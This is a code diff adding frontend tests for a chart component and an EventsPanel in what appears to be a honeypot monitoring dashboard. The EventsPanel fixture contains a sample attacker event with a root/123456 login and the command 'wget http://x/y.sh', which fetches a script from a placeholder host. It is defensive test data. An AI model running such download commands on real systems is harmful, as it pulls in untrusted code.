@@ -4,6 +4,7 @@ import ErrorBoundary from "../components/common/ErrorBoundary";
 import SessionsPanel from "../components/SessionsPanel";
 import SessionDrawer from "../components/SessionDrawer";
 import CommandsPanel from "../components/CommandsPanel";
+import EventsPanel from "../components/EventsPanel";
 import AreaSparkline from "../components/common/AreaSparkline";
 
 const noop = () => {};
@@ -207,5 +208,66 @@ describe("AreaSparkline", () => {
   it("places a single point without producing NaN coordinates", () => {
     const { container } = render(<AreaSparkline data={[{ label: "only", value: 3 }]} />);
     expect(container.querySelector("path").getAttribute("d")).not.toMatch(/NaN/);
+  });
+
+  it("maps one svg unit to one pixel so nothing is distorted", () => {
+    // The chart used to stretch a fixed 600x200 viewBox to the container with
+    // preserveAspectRatio="none", which scales each axis by a different
+    // factor: text came out squashed and the hover dot was an ellipse.
+    const { container } = render(<AreaSparkline data={data} height={160} />);
+    const svg = container.querySelector("svg");
+    expect(svg.getAttribute("preserveAspectRatio")).toBeNull();
+    const [, , vbW, vbH] = svg.getAttribute("viewBox").split(" ").map(Number);
+    expect(vbW).toBe(Number(svg.getAttribute("width")));
+    expect(vbH).toBe(Number(svg.getAttribute("height")));
+    expect(vbH).toBe(160);
+  });
+
+  it("rounds the y-axis up to readable gridline values", () => {
+    // A raw peak produces ticks like 0 / 410 / 819 / 1229 / 1638.
+    const { container } = render(<AreaSparkline data={[{ label: "a", value: 1638 }]} />);
+    const labels = [...container.querySelectorAll("text")].map((t) => t.textContent);
+    for (const tick of ["0", "500", "1,000", "1,500", "2,000"]) {
+      expect(labels, `expected a ${tick} gridline`).toContain(tick);
+    }
+  });
+
+  it("still reports the real peak to screen readers, not the rounded axis", () => {
+    render(<AreaSparkline data={[{ label: "a", value: 1638 }]} />);
+    expect(screen.getByRole("img", { name: /peak 1638/i })).toBeInTheDocument();
+  });
+});
+
+describe("EventsPanel", () => {
+  const events = [{
+    timestamp: "2026-08-16T10:00:00Z", src_ip: "1.2.3.4", dest_port: 22,
+    username: "root", password: "123456", command: "wget http://x/y.sh",
+    session_id: "s1", country_iso: "CN",
+  }];
+  const props = {
+    events, eventLimit: 50, formatTimestamp: fmtTs,
+    renderGeoPill: (ev) => <span>{ev.country_iso}</span>,
+  };
+
+  it("fills its grid cell instead of leaving dead space below the rows", () => {
+    // The panel sits beside a column of six stacked panels, so the grid
+    // stretches it far taller than its own content. Without a flex column the
+    // frame was drawn full height with the table stopping partway down.
+    const { container } = render(<EventsPanel {...props} />);
+    const root = container.firstChild;
+    expect(root.className).toMatch(/\bflex\b/);
+    expect(root.className).toMatch(/\bflex-col\b/);
+    expect(root.className).toMatch(/\bh-full\b/);
+  });
+
+  it("renders an event row", () => {
+    render(<EventsPanel {...props} />);
+    expect(screen.getByText("1.2.3.4")).toBeInTheDocument();
+    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
+  });
+
+  it("shows the waiting message when there is nothing yet", () => {
+    render(<EventsPanel {...props} events={[]} />);
+    expect(screen.getByText(/waiting for attackers/i)).toBeInTheDocument();
   });
 });
